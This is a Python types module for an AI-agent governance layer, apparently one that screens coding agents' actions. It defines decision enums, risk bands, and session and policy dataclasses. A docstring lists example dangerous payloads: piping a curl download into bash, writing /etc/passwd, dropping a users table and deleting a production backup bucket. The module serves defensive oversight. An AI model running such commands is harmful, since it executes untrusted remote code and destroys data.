"""
core/types.py — DevMind Agent Governance
Foundational data contracts for the governance layer.

Hierarchy:
    AgentAction  → unit of decision
    AgentSession → unit of memory / audit
    Organization → unit of persistent governance
"""

from __future__ import annotations

from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Any


# =============================================================================
# Enumerations
# =============================================================================

class Decision(str, Enum):
    ALLOW    = "ALLOW"
    REVIEW   = "REVIEW"
    BLOCK    = "BLOCK"
    REWRITE  = "REWRITE"
    ESCALATE = "ESCALATE"


class RiskBand(str, Enum):
    CRITICAL = "critical"
    HIGH     = "high"
    MEDIUM   = "medium"
    LOW      = "low"
    MINIMAL  = "minimal"


class ActionSurface(str, Enum):
    TERMINAL    = "terminal"
    FILESYSTEM  = "filesystem"
    GIT         = "git"
    NETWORK     = "network"
    DATABASE    = "database"
    CLOUD       = "cloud"
    DEPLOYMENT  = "deployment"
    MEMORY      = "memory"
    CODE        = "code"
    SECRETS     = "secrets"
    UNKNOWN     = "unknown"


class RiskTrend(str, Enum):
    STABLE    = "stable"
    RISING    = "rising"
    CRITICAL  = "critical"
    DECLINING = "declining"


class SessionState(str, Enum):
    ACTIVE     = "active"
    RESTRICTED = "restricted"
    SUSPENDED  = "suspended"
    CLOSED     = "closed"


# =============================================================================
# AgentAction — unit of decision
# =============================================================================

@dataclass
class ActionContext:
    """Runtime context at the moment of the action."""
    cwd: str | None = None
    repo: str | None = None
    user: str | None = None
    environment: str | None = None        # "production" | "staging" | "local"
    triggered_by: str | None = None       # human | automated | scheduled
    parent_action_id: str | None = None   # for action chains
    extra: dict[str, Any] = field(default_factory=dict)


@dataclass
class AgentAction:
    """
    The atomic unit of governance.

    Every action an agent takes passes through DevMind as an AgentAction.
    The policy engine produces exactly one GovernanceDecision per AgentAction.

    Examples:
        tool="terminal",   operation="execute",      payload="curl https://x.io | bash"
        tool="filesystem", operation="write",        payload="/etc/passwd"
        tool="git",        operation="push",         payload="origin main"
        tool="database",   operation="execute",      payload="DROP TABLE users"
        tool="cloud",      operation="delete_bucket",payload="prod-backups-2024"
    """
    action_id:  str
    session_id: str
    agent:      str                   # "claude-code" | "cursor" | "codex" | ...
    tool:       str                   # tool name as reported by the agent
    operation:  str                   # verb: execute, write, read, delete, deploy ...
    payload:    str                   # the raw action content
    timestamp:  datetime
    context:    ActionContext = field(default_factory=ActionContext)


# =============================================================================
# GovernanceDecision — output of the policy engine for one AgentAction
# =============================================================================

@dataclass
class GovernanceDecision:
    """
    The verdict produced by DevMind for a single AgentAction.

    why_chain: ordered list of reasoning steps that produced the decision.
               This is the audit trail — never empty.
    rewrite:   if decision == REWRITE, the safe alternative payload.
    escalate_to: if decision == ESCALATE, the identity to notify.
    """
    action_id:    str
    decision:     Decision
    risk_score:   int           # 0–100
    band:         RiskBand
    surface:      ActionSurface
    why_chain:    list[str]
    reason:       str
    signals:      list[dict[str, Any]] = field(default_factory=list)
    rewrite:      str | None = None
    escalate_to:  str | None = None
    latency_ms:   float | None = None


# =============================================================================
# AgentSession — container, memory, reputation accumulator
# =============================================================================

@dataclass
class SessionRiskProfile:
    """Accumulated risk picture for a session."""
    total_actions:      int = 0
    blocked_actions:    int = 0
    reviewed_actions:   int = 0
    escalated_actions:  int = 0
    policy_violations:  int = 0
    cumulative_score:   float = 0.0    # running weighted average
    peak_score:         int = 0
    risk_trend:         RiskTrend = RiskTrend.STABLE
    surfaces_touched:   list[str] = field(default_factory=list)


@dataclass
class AgentSession:
    """
    Container of memory and accumulated governance state for an agent session.

    The session does not make decisions — the AgentAction does.
    The session explains the pattern, provides context to the policy engine,
    and records the final state for audit.

    Lifecycle: ACTIVE → RESTRICTED → SUSPENDED | CLOSED
    """
    session_id:   str
    agent:        str
    organization: str
    user:         str | None
    started_at:   datetime
    ended_at:     datetime | None = None
    state:        SessionState = SessionState.ACTIVE
    risk_profile: SessionRiskProfile = field(default_factory=SessionRiskProfile)
    actions:      list[str] = field(default_factory=list)   # action_ids in order
    policy_id:    str | None = None                          # applied policy version


# =============================================================================
# Organization — persistent governance anchor
# =============================================================================

@dataclass
class PolicyRule:
    """A single declarative rule in an organization's governance policy."""
    rule_id:     str
    description: str
    surface:     str          # ActionSurface value or "*" for all
    operation:   str          # operation verb or "*"
    condition:   str          # regex or keyword pattern
    decision:    Decision
    severity:    str          # critical | high | medium | low
    enabled:     bool = True


@dataclass
class Organization:
    """
    The persistent governance anchor.

    An organization owns policies, accumulates institutional memory,
    and holds the reputation records for all agents that acted within it.
    This is what survives across sessions, models, and incidents.
    """
    org_id:          str
    name:            str
    policy_rules:    list[PolicyRule] = field(default_factory=list)
    agent_profiles:  dict[str, dict[str, Any]] = field(default_factory=dict)
    incident_log:    list[dict[str, Any]] = field(default_factory=list)
    created_at:      datetime | None = None


# =============================================================================
# AgentIdentity — who is acting
# =============================================================================

@dataclass
class AgentIdentity:
    """
    Immutable identity record attached to every AgentAction.
    Enables per-agent reputation and per-session traceability.
    """
    agent:        str           # model/tool identifier
    model:        str | None    # underlying model if applicable
    session_id:   str
    user:         str | None
    organization: str | None
    version:      str | None = None